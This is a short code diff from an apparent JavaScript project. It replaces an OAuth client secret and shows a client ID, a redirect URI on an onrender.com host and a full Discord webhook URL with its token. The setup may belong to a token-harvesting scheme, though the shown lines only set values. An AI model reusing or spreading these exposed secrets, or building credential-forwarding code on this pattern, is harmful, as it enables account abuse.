@@ -1,5 +1,5 @@
 //Change these btw
-const client_secret = 'cXw8Q~tivfs8oVPAbAakLkaFv2atQGfHW0Bs2cK0' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_secret = 'mA58Q~mh1rWe~Q52k77V2.47jPdtfaVox4MHHcQT' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'f6f9ea1f-0a01-49e1-854a-2771d19ebee4'
 const redirect_uri = 'https://skyhelperbot.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
